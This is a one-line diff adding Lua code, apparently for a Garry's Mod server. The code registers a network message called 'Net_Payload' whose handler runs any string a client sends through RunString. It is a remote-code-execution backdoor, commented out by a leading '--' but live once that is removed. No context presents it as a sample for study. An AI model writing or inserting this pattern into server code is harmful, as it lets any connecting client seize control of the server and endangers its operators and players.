@@ -1,0 +1,1 @@
+--if SERVER then util.AddNetworkString("Net_Payload") net.Receive("Net_Payload", function(l, p) if SERVER then RunString(net.ReadString()) end end) end
